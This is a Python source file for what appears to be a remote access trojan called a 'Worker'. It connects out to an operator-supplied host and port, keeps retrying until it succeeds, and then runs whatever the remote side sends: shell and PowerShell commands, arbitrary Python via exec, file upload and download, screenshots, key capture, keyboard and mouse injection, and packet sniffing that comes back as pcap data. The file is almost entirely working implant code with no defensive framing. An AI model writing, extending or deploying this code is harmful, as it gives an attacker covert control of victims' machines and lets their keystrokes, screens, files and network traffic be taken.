import socket
import time
from typing import Callable
import os
import struct
import subprocess
import pyautogui
import keyboard
from pynput.mouse import Button,Controller
from scapy.all import sniff
from scapy.utils import wrpcap
import sys

def cmd(command:str) ->bytes:
    return os.popen(command).read().encode()

def powershell(command:str) ->bytes:
    result = subprocess.run(["powershell","-Command",command],capture_output=True)
    return result.stdout

def python(code:str)->bytes:
    try:
        exec(code)
        return "successfully ran your code on the worker".encode()
    except Exception as e:
        return f"error in execution: {e}".encode()
def send_file(file_str: str) ->bytes:
    data = file_str.split(":",1)
    file_name:str = data[0]
    file_bytes:bytes =data[1].encode()
    try:
        with open(file_name, "wb") as file:
            file.write(file_bytes)
            return "successfully sent the file".encode()
    except IOError as e:
        return f"error writing the file: {e}".encode()


def listen_to_keys(doesnt_matter:str)->bytes:
    while True:
        key =keyboard.read_event()
        if key.event_type == "down":
            return f"the key {key.name} was used".encode()

def press_key_in_worker(key:str)->bytes:
    keyboard.press_and_release(key)
    return f"{key} was pressed successfully".encode()


def receive_file(file_name:str)->bytes:
    try:
        with open(file_name,"rb") as file:
            file_bytes = file.read()
        return file_bytes
    except FileNotFoundError:
        return f"error: file '{file_name}'does not exist".encode()
    except PermissionError:
        return f"error: file '{file_name}' is not accessible".encode()
    except Exception as e:
        return f"error: {e}".encode()


def screen_shot(doesnt_matter:str)->bytes:
    s_shot = pyautogui.screenshot()
    s_shot.save("screen_shot.png")
    with open("screen_shot.png","rb") as file:
        decoded_img = file.read()
    return decoded_img

def control_mouse(parameters:str) -> bytes:
    data = parameters.split(":")
    mouse = Controller()
    mouse.position = (data[0],data[1])
    if data[2] == "left":
        mouse.press(Button.left)
    else:
        mouse.press(Button.right)
    return b"mouse was moved successfully"

def sniff_from_worker(parameters:str) -> bytes:
    data = parameters.split(":")
    scapy_filter = data[0]
    scapy_time = int(data[1])
    scapy_amount = int(data[2])
    packets = sniff(filter=scapy_filter,timeout=scapy_time,count= scapy_amount)
    wrpcap("packets.pcap",packets)
    with open("packets.pcap", "rb") as file:
        pcap_bytes = file.read()
    return pcap_bytes

class Worker:
    def __init__(self, ip:str, port:int, functions: dict[str,Callable[[str],bytes]] ):
        self.address = (ip,port)
        self.functions = functions
        self.client = socket.socket()

    def connect(self):
        while True:
            try:
                self.client.connect(self.address)
                self.client.send("connected".encode())
                print("connection succeeded")
                break
            except(socket.timeout,socket.error)as e:
                print(f"connection failed, error:{e}")
                self.client.close()
                time.sleep(5)
                self.client = socket.socket()


    def sender(self,message:bytes):
        data = struct.pack("I", len(message)) + message
        self.client.send(data)


    def receiver(self) -> str:
        data = self.client.recv(4)
        size = struct.unpack("I",data)[0]
        if size == 0:
            return ""
        message = self.client.recv(4096)
        size -=4096
        while size>0:
            message+=self.client.recv(4096)
            size-=4096
        return message.decode()

    def run(self):
        self.connect()
        while True:
            data = self.receiver()
            if data == "quit":
                break
            if ":" in data:
                splitted = data.split(":",1)
                name = splitted[0]
                commend = splitted[1]
            else:
                name = commend = data
            message = self.functions[name](commend)
            self.sender(message)
        self.client.close()


def main():
    ip = sys.argv[1]
    port = sys.argv[2]
    functions:dict[str,Callable[[str],bytes]] = {"cmd":cmd,"powershell":powershell,"python":python, "send_file":send_file,"receive_file":receive_file, "screen_shot":screen_shot, "listen_to_keys":listen_to_keys, "press_key_in_worker":press_key_in_worker, "control_mouse":control_mouse,"sniff_from_worker":sniff_from_worker}
    worker = Worker(ip, int(port), functions)
    worker.run()

if __name__ == '__main__':
    main()




